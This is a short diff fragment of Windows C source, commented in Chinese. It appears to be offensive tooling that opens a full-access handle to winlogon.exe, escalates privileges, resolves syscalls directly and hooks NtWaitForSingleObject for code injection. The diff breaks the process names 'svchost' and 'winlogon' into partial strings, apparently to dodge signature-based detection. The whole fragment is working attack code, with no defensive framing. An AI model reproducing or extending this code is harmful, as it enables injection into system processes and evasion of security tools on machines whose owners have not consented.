@@ -733,7 +733,7 @@ DWORD_PTR ConvertSvcNameToPid(wchar_t* SvcName) {
     SFNtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &returnLength);
     PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
     while (TRUE) {
-        if (pInfo->ImageName.Buffer && wcsstr(pInfo->ImageName.Buffer, L"svchost")) {
+        if (pInfo->ImageName.Buffer && wcsstr(pInfo->ImageName.Buffer, L"vchost")) { // 即svchost.exe
             HANDLE hProcess = 0;
             CLIENT_ID clientId = { pInfo->UniqueProcessId, 0 };
             OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr) };
@@ -878,11 +878,10 @@ PVOID FindMemoryHole(HANDLE hProcess, PVOID referenceAddress, SIZE_T size) {
     return NULL;
 }
 
-// 主函数
 int main() {
     // Step 1: 权限提升，获取 winlogon 的完全访问句柄
-    AddVectoredExceptionHandler(1, ExceptionHandler); // 假设 ExceptionHandler 已定义
-    DWORD_PTR WinLogonPid = ConvertProcNameToPid(L"winlogon.exe");
+    AddVectoredExceptionHandler(1, ExceptionHandler);
+    DWORD_PTR WinLogonPid = ConvertProcNameToPid(L"inlog"); // 即Winlogon.exe
     printf("[+] WinLogon PID Found: %lu\n", (unsigned long)WinLogonPid);
     HANDLE hWinLogonLowPriv = 0;
     CLIENT_ID clientId = { (HANDLE)WinLogonPid, 0 };
@@ -891,7 +890,7 @@ int main() {
     LocalPrivilege();
     HANDLE hWinLogon = ElevateHandle(hWinLogonLowPriv, PROCESS_ALL_ACCESS, OBJ_INHERIT);
 
-// Step 2: 获取 NtWaitForSingleObject 的地址
+    // Step 2: 获取 NtWaitForSingleObject 的地址
     DWORD_PTR HookAddress = (DWORD_PTR)SW3_GetSyscallAddress(0x0E05EC0E2) + 2;
     printf("[+] Hook Address: 0x%p\n", (void*)HookAddress);
 
